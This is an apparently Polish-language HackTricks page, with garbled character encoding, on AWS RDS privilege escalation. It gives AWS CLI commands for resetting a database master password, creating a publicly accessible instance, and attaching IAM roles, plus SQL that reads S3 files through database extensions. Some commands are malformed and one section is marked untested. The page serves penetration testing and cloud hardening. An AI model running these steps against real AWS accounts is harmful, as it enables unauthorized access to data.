# AWS - Eskalacja uprawnieÅ„ w usÅ‚udze RDS

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## RDS - UsÅ‚uga bazy danych relacyjnych

Aby uzyskaÄ‡ wiÄ™cej informacji na temat RDS, sprawdÅº:

{% content-ref url="../aws-services/aws-databases/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-databases/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

Z tym uprawnieniem atakujÄ…cy moÅ¼e **zmieniÄ‡ hasÅ‚o uÅ¼ytkownika gÅ‚Ã³wnego** oraz logowanie do bazy danych:
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
BÄ™dziesz musiaÅ‚ byÄ‡ w stanie **skontaktowaÄ‡ siÄ™ z bazÄ… danych** (zazwyczaj sÄ… one dostÄ™pne tylko z wewnÄ…trz sieci).
{% endhint %}

**Potencjalne zagroÅ¼enie:** Znalezienie wraÅ¼liwych informacji w bazach danych.

### rds-db:connect

Zgodnie z [**dokumentacjÄ…**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html), uÅ¼ytkownik posiadajÄ…cy to uprawnienie moÅ¼e poÅ‚Ä…czyÄ‡ siÄ™ z instancjÄ… bazy danych.

### Wykorzystanie uprawnieÅ„ roli RDS IAM

#### Postgresql (Aurora)

{% hint style="success" %}
JeÅ›li wykonasz **`SELECT datname FROM pg_database;`** i znajdziesz bazÄ™ danych o nazwie **`rdsadmin`**, bÄ™dziesz wiedziaÅ‚, Å¼e jesteÅ› wewnÄ…trz bazy danych **AWS postgresql**.
{% endhint %}

Najpierw moÅ¼esz sprawdziÄ‡, czy ta baza danych zostaÅ‚a uÅ¼yta do uzyskania dostÄ™pu do innej usÅ‚ugi AWS. MoÅ¼esz to sprawdziÄ‡, analizujÄ…c zainstalowane rozszerzenia:
```sql
SELECT * FROM pg_extension;
```
JeÅ›li znajdziesz coÅ› takiego jak **`aws_s3`**, moÅ¼esz przypuszczaÄ‡, Å¼e ta baza danych ma **pewien rodzaj dostÄ™pu do S3** (istniejÄ… rÃ³wnieÅ¼ inne rozszerzenia, takie jak **`aws_ml`** i **`aws_lambda`**).

Dodatkowo, jeÅ›li masz uprawnienia do uruchomienia **`aws rds describe-db-clusters`**, moÅ¼esz sprawdziÄ‡, czy **klaster ma przypisanÄ… jakÄ…Å› rolÄ™ IAM** w polu **`AssociatedRoles`**. JeÅ›li tak, moÅ¼esz przypuszczaÄ‡, Å¼e baza danych zostaÅ‚a **przygotowana do dostÄ™pu do innych usÅ‚ug AWS**. Na podstawie **nazwy roli** (lub jeÅ›li moÅ¼esz uzyskaÄ‡ **uprawnienia** roli), moÅ¼esz **zgadywaÄ‡**, jakie dodatkowe uprawnienia ma baza danych.

Teraz, aby **odczytaÄ‡ plik wewnÄ…trz kubeÅ‚ka**, musisz znaÄ‡ peÅ‚nÄ… Å›cieÅ¼kÄ™. MoÅ¼esz to odczytaÄ‡ za pomocÄ…:
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
JeÅ›li masz **surowe poÅ›wiadczenia AWS**, moÅ¼esz ich rÃ³wnieÅ¼ uÅ¼yÄ‡ do uzyskania dostÄ™pu do danych S3 za pomocÄ…:
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **nie musi zmieniaÄ‡ Å¼adnej zmiennej grupy parametrÃ³w**, aby mÃ³c uzyskaÄ‡ dostÄ™p do S3.
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
WewnÄ…trz mysql, jeÅ›li wykonasz zapytanie **`SELECT User, Host FROM mysql.user;`** i istnieje uÅ¼ytkownik o nazwie **`rdsadmin`**, moÅ¼esz przypuszczaÄ‡, Å¼e znajdujesz siÄ™ w **AWS RDS mysql db**.
{% endhint %}

WewnÄ…trz mysql wykonaj **`show variables;`** i jeÅ›li zmienne takie jak **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`** majÄ… wartoÅ›ci, moÅ¼esz przypuszczaÄ‡, Å¼e baza danych jest przygotowana do dostÄ™pu do danych S3.

Dodatkowo, jeÅ›li masz uprawnienia do uruchomienia **`aws rds describe-db-clusters`**, moÅ¼esz sprawdziÄ‡, czy klastr ma jakÄ…Å› **powiÄ…zanÄ… rolÄ™**, co zazwyczaj oznacza dostÄ™p do usÅ‚ug AWS).

Teraz, aby **odczytaÄ‡ plik wewnÄ…trz kubeÅ‚ka**, musisz znaÄ‡ peÅ‚nÄ… Å›cieÅ¼kÄ™. MoÅ¼esz to odczytaÄ‡ za pomocÄ…:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

AtakujÄ…cy posiadajÄ…cy uprawnienia `rds:AddRoleToDBCluster` i `iam:PassRole` moÅ¼e **dodaÄ‡ okreÅ›lonÄ… rolÄ™ do istniejÄ…cej instancji RDS**. MoÅ¼e to umoÅ¼liwiÄ‡ atakujÄ…cemu **dostÄ™p do wraÅ¼liwych danych** lub modyfikacjÄ™ danych wewnÄ…trz instancji.
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Potencjalne skutki**: DostÄ™p do poufnych danych lub nieautoryzowane modyfikacje danych w instancji RDS.\
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e niektÃ³re bazy danych wymagajÄ… dodatkowych konfiguracji, takich jak Mysql, ktÃ³ry musi okreÅ›liÄ‡ ARN roli w grupach parametrÃ³w.

### `rds:CreateDBInstance`

Tylko z tym uprawnieniem atakujÄ…cy mÃ³gÅ‚by utworzyÄ‡ **nowÄ… instancjÄ™ wewnÄ…trz istniejÄ…cego klastra**, ktÃ³ry ma przypisanÄ… **rolÄ™ IAM**. Nie bÄ™dzie mÃ³gÅ‚ zmieniÄ‡ hasÅ‚a gÅ‚Ã³wnego uÅ¼ytkownika, ale moÅ¼e byÄ‡ w stanie wystawiÄ‡ nowÄ… instancjÄ™ bazy danych do internetu:
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: Test
{% endhint %}

AtakujÄ…cy posiadajÄ…cy uprawnienia `rds:CreateDBInstance` i `iam:PassRole` moÅ¼e **utworzyÄ‡ nowÄ… instancjÄ™ RDS z przypisanÄ… okreÅ›lonÄ… rolÄ…**. AtakujÄ…cy moÅ¼e nastÄ™pnie potencjalnie **uzyskaÄ‡ dostÄ™p do wraÅ¼liwych danych** lub modyfikowaÄ‡ dane wewnÄ…trz instancji.

{% hint style="warning" %}
NiektÃ³re wymagania dotyczÄ…ce roli/profilu instancji do przypisania (z [**tutaj**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

* Profil musi istnieÄ‡ w Twoim koncie.
* Profil musi mieÄ‡ rolÄ™ IAM, ktÃ³rÄ… Amazon EC2 ma uprawnienia do przejÄ™cia.
* Nazwa profilu instancji i powiÄ…zana nazwa roli IAM muszÄ… zaczynaÄ‡ siÄ™ od prefiksu `AWSRDSCustom`.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**Potencjalne skutki**: DostÄ™p do poufnych danych lub nieautoryzowane modyfikacje danych w instancji RDS.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

AtakujÄ…cy posiadajÄ…cy uprawnienia `rds:AddRoleToDBInstance` i `iam:PassRole` moÅ¼e **dodaÄ‡ okreÅ›lonÄ… rolÄ™ do istniejÄ…cej instancji RDS**. MoÅ¼e to umoÅ¼liwiÄ‡ atakujÄ…cemu **dostÄ™p do poufnych danych** lub modyfikacjÄ™ danych wewnÄ…trz instancji.

{% hint style="warning" %}
Instancja bazy danych musi znajdowaÄ‡ siÄ™ poza klastrami.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**Potencjalne skutki**: DostÄ™p do wraÅ¼liwych danych lub nieautoryzowane modyfikacje danych w instancji RDS.

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
